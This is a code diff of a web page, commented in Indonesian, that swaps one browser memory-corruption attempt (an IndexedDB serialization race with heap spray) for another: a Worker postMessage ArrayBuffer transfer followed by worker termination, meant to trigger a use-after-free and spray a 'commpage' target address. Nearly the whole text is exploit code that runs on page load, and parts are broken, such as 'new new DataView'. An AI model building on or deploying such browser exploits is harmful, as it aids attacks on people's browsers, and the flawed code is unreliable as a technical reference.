@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IndexedDB Serialization Corruption Attack</title>
+    <title>PostMessage Transfer Lifecycle Attack</title>
 </head>
 <body>
 
-    <h1>IndexedDB Serialization Attack (Commpage Target)</h1>
+    <h1>PostMessage Transfer UAF Attack (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Database...</p>
+    <p id="status">INIT: Mempersiapkan Worker dan Transfer...</p>
     <div id="log"></div>
 
     <script>
@@ -19,7 +19,8 @@
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let db = null;
+        let worker = null;
+        let victimBuffer = null;
         let payloadHolders = []; 
 
         function log(message) {
@@ -41,95 +42,63 @@
             log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
         }
 
-        // --- OBJEK KORBAN UNTUK SERIALIZATION ---
-        // Objek ini dirancang untuk memiliki 'state' internal yang kompleks
-        function createComplexVictim() {
-            // Membuat objek dengan 'getter' yang memicu side-effect (potensi race condition)
-            let complexObj = {
-                id: 1,
-                // Properti yang akan dibaca selama serialization
-                get dangerousProp() {
-                    // Memicu Heap Spray saat WebKit mencoba menserialisasi objek
-                    sprayPayload();
-                    // Mengembalikan objek ArrayBuffer yang akan diserialisasi
-                    return new ArrayBuffer(512); 
-                },
-                // Getter/Setter untuk menambah kompleksitas
-                set value(v) {
-                    this._v = v;
-                }
-            };
-
-            // Tambahkan objek yang sulit diserialisasi (seperti AudioBuffer yang sedang aktif)
-            try {
-                 let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                 complexObj.audioData = audioCtx.createBuffer(1, 1024, audioCtx.sampleRate);
-            } catch(e) {
-                 complexObj.audioData = new ArrayBuffer(256);
-            }
-            
-            return complexObj;
-        }
-
         // --- FUNGSI UTAMA ATTACK ---
-        function runIDBAttack() {
-            if (!window.indexedDB) {
-                log("ERROR: IndexedDB tidak didukung.");
-                return;
-            }
+        function runTransferAttack() {
+            log("Phase 1: Membuat Objek Korban dan Worker.");
             
-            log("Phase 1: Membuka IndexedDB...");
-            const request = indexedDB.open("ExploitDB", 1);
+            // 1. Objek Korban (Victim Buffer)
+            // ArrayBuffer adalah objek yang dapat ditransfer (ownership berpindah)
+            victimBuffer = new ArrayBuffer(512); 
+            let victimView = new new DataView(victimBuffer);
+            victimView.setUint32(0, 0xBBBBBBBB, true); // Pola unik
 
-            request.onupgradeneeded = function(event) {
-                db = event.target.result;
-                // Buat Object Store untuk menyimpan data
-                db.createObjectStore("exploitStore", { keyPath: "id" });
-                log("DB Store dibuat.");
-            };
+            // 2. Worker (Attacker Thread)
+            worker = new Worker('worker_transfer.js');
+            worker.postMessage({ cmd: 'setup' });
 
-            request.onsuccess = function(event) {
-                db = event.target.result;
+            // 3. Memicu Transfer dan UAF Race
+            log("Phase 2: Memicu Transfer Buffer dan Lifecycle Confusion...");
+            
+            // Waktu Kritis: Transfer (perpindahan pointer C++ antar thread)
+            worker.postMessage({ cmd: 'transfer', buffer: victimBuffer, low: LOW_WORD, high: HIGH_WORD }, [victimBuffer]);
+            
+            // Setelah dipostMessage, victimBuffer menjadi "detached" (diputus/invalid) di thread utama.
+            // Pointer C++-nya sekarang sedang dalam proses penanganan oleh Worker.
+
+            // 4. Trigger Race dan Corrupt Destructor
+            // HENTIKAN Worker segera setelah transfer dipost. Ini memaksa C++ WebKit 
+            // untuk membersihkan thread Worker dan objek yang sedang diproses.
+            setTimeout(() => {
+                log("Phase 3: TERMINATE Worker (Memaksa Destructor Cleanup!).");
+                worker.terminate();
                 
-                const victim = createComplexVictim();
-                const transaction = db.transaction(["exploitStore"], "readwrite");
-                const store = transaction.objectStore("exploitStore");
-
-                log("Phase 2: Memicu Serialization dengan Objek Korban...");
+                // Lakukan spray di thread utama, berharap menimpa memori yang baru di-free oleh terminate
+                sprayPayload();
                 
-                // 3. Titik Eksploitasi: PUT data yang kompleks
-                // Getter 'dangerousProp' akan memicu Heap Spray tepat di tengah-tengah serialization
-                const putRequest = store.put(victim); 
+                // Trigger UAF (Akses victimBuffer yang sudah detached/freed)
+                log("Phase 4: Mencoba Trigger UAF pada Buffer yang Detached/Freed...");
+                try {
+                    // Akses properti view pada buffer yang sudah ditransfer (detached) dan kemudian di-free oleh terminate.
+                    let check = victimView.getUint32(0, true); 
+                    log(`Dereference: Nilai dibaca dari buffer lama: 0x${check.toString(16)}`);
+                    
+                    // Jika tidak crash, coba alokasi objek baru yang menimpa memori lama
+                    let attackerView = new DataView(new ArrayBuffer(512));
+                    let finalRead = attackerView.getUint32(0, true);
+                    
+                    log(`Final Read: 0x${finalRead.toString(16)}`);
+                    
+                } catch (e) {
+                    log("JS Error: " + e.message + " - Menunggu Segfault OS.");
+                }
 
-                putRequest.onsuccess = function() {
-                    log("Serialization Selesai (Mungkin Corrupt).");
-                };
-
-                putRequest.onerror = function() {
-                    // Jika putRequest gagal, itu adalah indikasi yang sangat baik bahwa serialization buffer corrupt!
-                    log("ERROR: PUT GAGAL. Ini MUNGKIN CRASH YANG KITA CARI!");
-                    // Kita coba trigger dereference (walaupun mungkin tidak perlu jika crash sudah terjadi)
-                    try {
-                        // Coba hapus database untuk memicu cleanup di thread lain
-                        indexedDB.deleteDatabase("ExploitDB");
-                    } catch(e) {}
-                };
-                
-                // Memicu trigger terakhir saat transaksi selesai
-                transaction.oncomplete = function() {
-                    log("Phase 3: Transaksi selesai. Menunggu Segfault.");
-                };
-            };
-
-            request.onerror = function(event) {
-                log("DB Error: " + event.target.errorCode);
-            };
+            }, 50); // Jarak waktu yang sangat singkat untuk memicu race
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian IndexedDB Attack...';
-            setTimeout(runIDBAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Serialization Corruption.';
+            document.getElementById('status').textContent = 'Memulai rangkaian Transfer UAF...';
+            setTimeout(runTransferAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF Antar-Thread.';
         });
 
     </script>
